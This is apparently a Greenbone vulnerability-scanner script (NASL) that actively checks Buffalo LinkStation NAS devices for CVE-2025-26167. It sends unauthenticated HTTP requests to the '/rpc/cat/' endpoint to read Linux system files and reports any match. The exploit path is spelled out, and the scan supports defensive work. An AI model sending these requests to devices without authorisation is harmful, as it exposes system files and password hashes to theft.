# SPDX-FileCopyrightText: 2025 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE_PREFIX = "cpe:/o:buffalo:";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.154144");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2025-03-07 04:29:32 +0000 (Fri, 07 Mar 2025)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_cve_id("CVE-2025-26167");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Buffalo LinkStation Arbitrary File Read Vulnerability (Mar 2025) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2025 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_buffalo_nas_http_detect.nasl");
  script_mandatory_keys("buffalo/nas/http/detected");
  script_require_ports("Services/www", 9000);

  script_tag(name:"summary", value:"Buffalo LinkStation is prone to an arbitrary file read
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An unauthenticated attacker can ready arbitrary internal files,
  that may disclose sensitive data (e.g., web UI password hashes).");

  script_tag(name:"affected", value:"Buffalo LinkStation LS520D version 4.53 is known to be
  vulnerable. Other models/versions might be affected as well.");

  script_tag(name:"solution", value:"Update to version 4.54 or later.");

  script_xref(name:"URL", value:"https://github.com/SpikeReply/advisories/blob/0f15f5aefb959fbaff049da7cc3e36733e25b580/cve/buffalo/cve-2025-26167.md");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www", first_cpe_only: TRUE))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

files = traversal_files("linux");

foreach pattern (keys(files)) {
  url = "/rpc/cat/" + files[pattern] + "?inter=1";

  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    report = "It was possible to obtain the file '" + files[pattern] + "' via '" +
             http_report_vuln_url(port: port, url: url, url_only: TRUE) + "'." +
             '\n\nResult:\n\n' + chomp(res);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
